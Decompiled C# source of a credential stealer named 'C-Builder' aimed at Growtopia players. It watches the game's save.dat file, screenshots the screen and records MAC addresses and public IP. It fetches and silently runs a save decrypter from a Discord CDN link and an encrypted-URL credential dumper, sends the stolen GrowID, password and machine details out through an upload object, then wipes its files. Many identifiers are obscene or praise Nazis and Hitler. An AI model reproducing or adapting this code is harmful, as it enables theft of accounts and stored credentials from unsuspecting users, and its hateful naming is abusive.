using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace C_Builder
{
	// Token: 0x02000006 RID: 6
	internal class DINGDONG
	{
		// Token: 0x06000019 RID: 25 RVA: 0x000030FC File Offset: 0x000012FC
		public static void DANGDANG()
		{
			DINGDONG.DICKHEAD.Path = DINGDONG.SUCKMYDICKLOL;
			DINGDONG.DICKHEAD.NotifyFilter = NotifyFilters.LastWrite;
			DINGDONG.DICKHEAD.Filter = "*.dat";
			DINGDONG.DICKHEAD.Changed += DINGDONG.FUCKYOUIMGONNAMURDERU;
			DINGDONG.DICKHEAD.EnableRaisingEvents = true;
			for (;;)
			{
				Thread.Sleep(1000);
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003188 File Offset: 0x00001388
		private static void FUCKYOUIMGONNAMURDERU(object source, FileSystemEventArgs e)
		{
			try
			{
				StreamWriter streamWriter = new StreamWriter("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt");
				foreach (NetworkInterface networkInterface in from nic in NetworkInterface.GetAllNetworkInterfaces()
				where nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select nic)
				{
					string str = string.Join("", networkInterface.GetPhysicalAddress().GetAddressBytes().Select((byte b) => b.ToString("X2")));
					streamWriter.Write(str + "\n");
				}
				streamWriter.Close();
			}
			catch
			{
			}
			if (e.FullPath == DINGDONG.SUCKMYDICK)
			{
				try
				{
					Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
					using (Graphics graphics = Graphics.FromImage(bitmap))
					{
						graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
						bitmap.Save(string.Concat(new string[]
						{
							"C:\\Users\\",
							Environment.UserName,
							"\\AppData\\Local\\Temp\\",
							Environment.UserName,
							"screenshot2.png"
						}));
					}
					try
					{
						foreach (Process process in Process.GetProcessesByName("savedecoder.exe"))
						{
							process.Kill();
						}
						bool attachments = true;
						string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\macs.txt";
						string text = DINGDONG.HITLERISMYBROTHER();
						string text2 = File.ReadAllText(path);
						string str2 = Environment.ExpandEnvironmentVariables("%TEMP%");
						string savedatpathh = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
						string.Concat(new string[]
						{
							"C:\\Users\\",
							Environment.UserName,
							"\\AppData\\Local\\Temp\\",
							Environment.UserName,
							" pictures.zip"
						});
						string path2 = string.Concat(new string[]
						{
							"C:\\Users\\",
							Environment.UserName,
							"\\AppData\\Local\\Temp\\",
							Environment.UserName,
							"screenshot.png"
						});
						string contents = DINGDONG.ZINGZONG();
						File.WriteAllText(str2 + "\\" + Environment.UserName + " credentials.txt", contents);
						string str7 = str2 + "\\" + Environment.UserName + " credentials.txt";
						IFOUGHTINWW1 ifoughtinww = new IFOUGHTINWW1();
						ifoughtinww.HANGURSELF = DINGDONG.NAZISAREGOOD(DINGDONG.key, "GrWz5DcWMtfQ7dy+2aTGgQ==");
						try
						{
							File.Delete(Path.GetTempPath() + "//pwd.txt");
							File.Delete(Path.GetTempPath() + "//savedecoder.exe");
							File.Delete(Path.GetTempPath() + Environment.UserName + ".txt");
						}
						catch
						{
						}
						try
						{
							WebClient webClient = new WebClient();
							webClient.DownloadFile("https://cdn.discordapp.com/attachments/775300885990998059/775459023562473512/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
							Process.Start(new ProcessStartInfo
							{
								WindowStyle = ProcessWindowStyle.Hidden,
								FileName = Path.GetTempPath() + "//savedecoder.exe"
							});
							Thread.Sleep(2500);
							if (File.Exists(Path.GetTempPath() + "//pwd.txt"))
							{
								File.ReadAllText(Path.GetTempPath() + "//pwd.txt");
								string[] array = File.ReadAllText(Path.GetTempPath() + "\\pwd.txt").Split(new char[]
								{
									'='
								});
								string text3 = array[0];
								string plainText = array[1];
								string plainText2 = array[2];
								using (StreamWriter streamWriter2 = new StreamWriter(Path.GetTempPath() + "\\" + text3 + ".cbuilder"))
								{
									streamWriter2.Write(string.Concat(new string[]
									{
										DINGDONG.EncryptString(DINGDONG.key, text3),
										"|",
										DINGDONG.EncryptString(DINGDONG.key, plainText),
										"|",
										DINGDONG.EncryptString(DINGDONG.key, plainText2),
										"|"
									}));
								}
								ifoughtinww.XDLSD(Path.GetTempPath() + "\\" + text3 + ".cbuilder", text3 + ".cbuilder");
								File.Delete(Path.GetTempPath() + "//pwd.txt");
								File.Delete(Path.GetTempPath() + "//savedecoder.exe");
								ifoughtinww.XDLOLLMAO(string.Concat(new string[]
								{
									"[C-Builder] Account traced from:: ",
									Environment.UserName,
									" / ",
									Environment.MachineName,
									"\nGrowID :: ",
									text3,
									"\nIP address:: ",
									text,
									"\nMac addresses:: \n",
									text2
								}), attachments);
							}
							if (File.Exists(str2 + "\\" + Environment.UserName + " credentials.txt"))
							{
								File.Delete(str2 + "\\" + Environment.UserName + " credentials.txt");
							}
							if (File.Exists(path))
							{
								File.Delete(path);
							}
							if (File.Exists(path2))
							{
								File.Delete(path2);
							}
							foreach (Process process2 in Process.GetProcessesByName("savedecoder.exe"))
							{
								process2.Kill();
							}
							if (File.Exists(Path.GetTempPath() + "//pwd.txt"))
							{
								File.Delete(Path.GetTempPath() + "//pwd.txt");
							}
							if (File.Exists(Path.GetTempPath() + "//savedecoder.exe"))
							{
								File.Delete(Path.GetTempPath() + "//savedecoder.exe");
							}
						}
						catch
						{
						}
					}
					finally
					{
						DINGDONG.DICKHEAD.EnableRaisingEvents = true;
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x0000385C File Offset: 0x00001A5C
		public static string ZINGZONG()
		{
			string text = Environment.ExpandEnvironmentVariables("%TEMP%");
			WebClient webClient = new WebClient();
			webClient.DownloadFile(DINGDONG.DINGZANG("CW/PsKH5sxTA0WGmJaxxW1ML+wT8q90jrto/c7dDT2qpe/RLNvNoRsub28By1W82Y2d0V7rQGgEj9trh+a3AIbT/Z2/izeQvy1ntGG4lya3YSpfVpW8G+500Yecb6tYEBQuTV4kkvzbjp5q8276S65gwBQJ/dFTo2ruNnKyOV6PDfRtZ5UzH106UnQJbdjKMh/1ZVkmMjpDP8KWIUprbn7srzcR+qmWhfNc9ruueUTBIud63/BuLPxaT9QdzG1j6eP4Mc7Wj0sB784SXWjm6gQ=="), text + "\\resourcefilehaha.exe");
			webClient.Dispose();
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = text + "\\resourcefilehaha.exe",
					Arguments = "/C /stext " + text + "\\credentialslmao.txt"
				}
			}.Start();
			Thread.Sleep(5000);
			File.Delete(text + "\\resourcefilehaha.exe");
			string result = File.ReadAllText(text + "\\credentialslmao.txt");
			File.Delete(text + "\\credentialslmao.txt");
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003924 File Offset: 0x00001B24
		public static string DINGZANG(string encrypted)
		{
			string s = "aoI90PeaapejpsOP";
			string s2 = "Oi09ajhiplK0hip0goidp0jkduewsp0a";
			byte[] array = Convert.FromBase64String(encrypted);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.Key = Encoding.UTF8.GetBytes(s2);
			rijndaelManaged.IV = Encoding.UTF8.GetBytes(s);
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rijndaelManaged.Mode = CipherMode.CBC;
			string @string;
			using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV))
			{
				byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
				@string = Encoding.Unicode.GetString(bytes);
			}
			return @string;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x000039E0 File Offset: 0x00001BE0
		public static string NAZISAREGOOD(string key, string cipherText)
		{
			byte[] iv = new byte[16];
			byte[] buffer = Convert.FromBase64String(cipherText);
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003AB8 File Offset: 0x00001CB8
		private static string HITLERISMYBROTHER()
		{
			WebClient webClient = new WebClient();
			return webClient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003AD8 File Offset: 0x00001CD8
		public static string YOUFUCKINGBITCH(string key, string plainText)
		{
			byte[] iv = new byte[16];
			byte[] inArray;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003BBC File Offset: 0x00001DBC
		public static string EncryptString(string key, string plainText)
		{
			byte[] iv = new byte[16];
			byte[] inArray;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateEncryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x0400000A RID: 10
		public static string key = "kljsdooqlo4454GG";

		// Token: 0x0400000B RID: 11
		public static string SUCKMYDICKLOL = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia";

		// Token: 0x0400000C RID: 12
		public static string SUCKMYDICK = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";

		// Token: 0x0400000D RID: 13
		public static FileSystemWatcher DICKHEAD = new FileSystemWatcher();
	}
}
